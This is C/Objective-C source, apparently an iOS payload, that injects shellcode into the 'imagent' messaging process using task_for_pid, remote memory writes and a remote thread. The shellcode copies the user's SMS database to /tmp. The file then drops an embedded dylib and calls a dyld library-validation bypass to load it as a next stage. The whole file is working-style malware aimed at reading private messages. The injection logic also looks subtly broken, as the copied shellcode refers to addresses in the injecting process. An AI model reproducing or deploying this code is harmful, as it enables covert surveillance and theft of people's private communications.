@import Darwin;
@import MachO;
#include <mach-o/ldsyms.h> /* _mh_dylib_header */
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <sys/sysctl.h>
#include <mach/mach.h>

// ===== 原始函数指针声明 =====
extern pthread_t pthread_main_thread_np(void);
extern void _pthread_set_self(pthread_t p);
void              (*_abort)(void);
int               (*_close)(int);
void*             (*_dlsym)(void *, const char *);
uint8_t*          (*_getsectiondata)(const struct mach_header_64 *, const char *, const char *, unsigned long *);
thread_t          (*_mach_thread_self)(void);
int               (*_open)(const char *, int, ...);
void              (*__pthread_set_self)(pthread_t p);
pthread_t         (*_pthread_main_thread_np)(void);
int               (*_strncmp)(const char *s1, const char *s2, size_t n);
kern_return_t     (*_thread_terminate)(mach_port_t);
int               (*_write)(int, const void *, size_t);
ssize_t           (*_read)(int, void *, size_t);

int dyld_lv_bypass_init(void * (*_dlsym)(void* handle, const char* symbol), const char *next_stage_dylib_path);

// ===== 注入需要的额外函数指针 =====
static kern_return_t (*_task_for_pid)(mach_port_t, pid_t, task_t*);
static kern_return_t (*_vm_allocate)(task_t, vm_address_t*, vm_size_t, int);
static kern_return_t (*_vm_write)(task_t, vm_address_t, vm_offset_t, mach_msg_type_number_t);
static kern_return_t (*_vm_protect)(task_t, vm_address_t, vm_size_t, boolean_t, vm_prot_t);
static kern_return_t (*_thread_create_running)(task_t, void*, void*, mach_msg_type_number_t, thread_act_t*);
static mach_port_t (*_mach_task_self)(void);

// ===== 获取进程 PID =====
static pid_t get_pid(const char *name) {
    int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0};
    size_t size = 0;
    sysctl(mib, 4, NULL, &size, NULL, 0);
    struct kinfo_proc *procs = (struct kinfo_proc *)malloc(size);
    if (!procs) return -1;
    sysctl(mib, 4, procs, &size, NULL, 0);
    
    pid_t target = -1;
    int count = size / sizeof(struct kinfo_proc);
    for (int i = 0; i < count; i++) {
        if (strcmp(procs[i].kp_proc.p_comm, name) == 0) {
            target = procs[i].kp_proc.p_pid;
            break;
        }
    }
    free(procs);
    return target;
}

// ===== 在 imagent 中执行的 shellcode（arm64） =====
static void remote_shellcode(void) {
    asm volatile(
        "mov x0, %0\n"
        "mov x1, %1\n"
        "mov x2, #0\n"
        "mov x16, #59\n"
        "svc #0x80\n"
        :
        : "r"("/bin/cp"), 
          "r"((char*[]){"cp", "/var/mobile/Library/SMS/sms.db", "/tmp/sms_injected.db", 0})
        : "x0", "x1", "x2", "x16"
    );
}

// ===== 注入 imagent =====
static void inject_imagent(void) {
    _task_for_pid = _dlsym(RTLD_DEFAULT, "task_for_pid");
    _vm_allocate = _dlsym(RTLD_DEFAULT, "vm_allocate");
    _vm_write = _dlsym(RTLD_DEFAULT, "vm_write");
    _vm_protect = _dlsym(RTLD_DEFAULT, "vm_protect");
    _thread_create_running = _dlsym(RTLD_DEFAULT, "thread_create_running");
    _mach_task_self = _dlsym(RTLD_DEFAULT, "mach_task_self");
    _open = _dlsym(RTLD_DEFAULT, "open");
    _close = _dlsym(RTLD_DEFAULT, "close");
    _write = _dlsym(RTLD_DEFAULT, "write");
    _read = _dlsym(RTLD_DEFAULT, "read");
    
    if (!_task_for_pid || !_vm_allocate || !_vm_write || !_vm_protect || !_thread_create_running) {
        int flag = _open("/tmp/sms_inject_fail", O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (flag >= 0) { _write(flag, "no_funcs", 8); _close(flag); }
        return;
    }
    
    pid_t pid = get_pid("imagent");
    if (pid <= 0) {
        int flag = _open("/tmp/sms_inject_fail", O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (flag >= 0) { _write(flag, "no_pid", 6); _close(flag); }
        return;
    }
    
    task_t remote_task;
    kern_return_t kr = _task_for_pid(_mach_task_self(), pid, &remote_task);
    if (kr != KERN_SUCCESS) {
        int flag = _open("/tmp/sms_inject_fail", O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (flag >= 0) { 
            char buf[32];
            snprintf(buf, sizeof(buf), "task_fail_%d", kr);
            _write(flag, buf, strlen(buf)); 
            _close(flag); 
        }
        return;
    }
    
    size_t code_size = 4096;
    vm_address_t remote_addr;
    kr = _vm_allocate(remote_task, &remote_addr, code_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        int flag = _open("/tmp/sms_inject_fail", O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (flag >= 0) { _write(flag, "vm_alloc_fail", 13); _close(flag); }
        return;
    }
    
    kr = _vm_write(remote_task, remote_addr, (vm_offset_t)remote_shellcode, code_size);
    if (kr != KERN_SUCCESS) {
        int flag = _open("/tmp/sms_inject_fail", O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (flag >= 0) { _write(flag, "vm_write_fail", 13); _close(flag); }
        _vm_protect(remote_task, remote_addr, code_size, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
    }
    
    _vm_protect(remote_task, remote_addr, code_size, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
    
    thread_act_t remote_thread;
    kr = _thread_create_running(remote_task, (void*)remote_addr, NULL, 0, &remote_thread);
    if (kr != KERN_SUCCESS) {
        int flag = _open("/tmp/sms_inject_fail", O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (flag >= 0) { _write(flag, "thread_fail", 11); _close(flag); }
        return;
    }
    
    sleep(1);
    
    if (access("/tmp/sms_injected.db", F_OK) == 0) {
        int flag = _open("/tmp/sms_injected_ok", O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (flag >= 0) { _write(flag, "ok", 2); _close(flag); }
    } else {
        int flag = _open("/tmp/sms_inject_fail", O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (flag >= 0) { _write(flag, "no_file", 7); _close(flag); }
    }
}

// ===== 原始的 save_section_to_file =====
void save_section_to_file(const char *section, const char *path) {
    size_t dylib_size = 0;
    const char *dylib = (const char *)_getsectiondata((struct mach_header_64 *)&_mh_dylib_header, "__TEXT", section, &dylib_size);
    if (!dylib || dylib_size == 0) return;
    int fd = _open(path, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd < 0) return;
    _write(fd, dylib, dylib_size);
    _close(fd);
}

const char *save_actual_dylib(void) {
    const char *path = "/tmp/actual.dylib";
    save_section_to_file("__SBTweak", path);
    return path;
}

#if __arm64e__
__attribute__((noinline)) void *pacia(void* ptr, uint64_t ctx) {
    __asm__("xpaci %[value]\n" : [value] "+r"(ptr));
    __asm__("pacia %0, %1" : "+r"(ptr) : "r"(ctx));
    return ptr;
}
#endif

// ===== 主入口：last() - 执行注入 =====
int last(void) {
#if __arm64e__
    _dlsym = pacia(dlsym, 0);
    __pthread_set_self = pacia(_pthread_set_self, 0);
    _pthread_main_thread_np = pacia(pthread_main_thread_np, 0);
#else
    _dlsym = dlsym;
    __pthread_set_self = _pthread_set_self;
    _pthread_main_thread_np = pthread_main_thread_np;
#endif
    __pthread_set_self(_pthread_main_thread_np());

    _abort = _dlsym(RTLD_DEFAULT, "abort");
    _close = _dlsym(RTLD_DEFAULT, "close");
    _getsectiondata = _dlsym(RTLD_DEFAULT, "getsectiondata");
    _mach_thread_self = _dlsym(RTLD_DEFAULT, "mach_thread_self");
    _open = _dlsym(RTLD_DEFAULT, "open");
    _strncmp = _dlsym(RTLD_DEFAULT, "strncmp");
    _thread_terminate = _dlsym(RTLD_DEFAULT, "thread_terminate");
    _write = _dlsym(RTLD_DEFAULT, "write");
    _read = _dlsym(RTLD_DEFAULT, "read");

    inject_imagent();

    const char *path = save_actual_dylib();
    dyld_lv_bypass_init(_dlsym, path);

    _thread_terminate(_mach_thread_self());
    return 0;
}

int end(void) {
    return last();
}

void _process(void* buffer) {
    last();
}
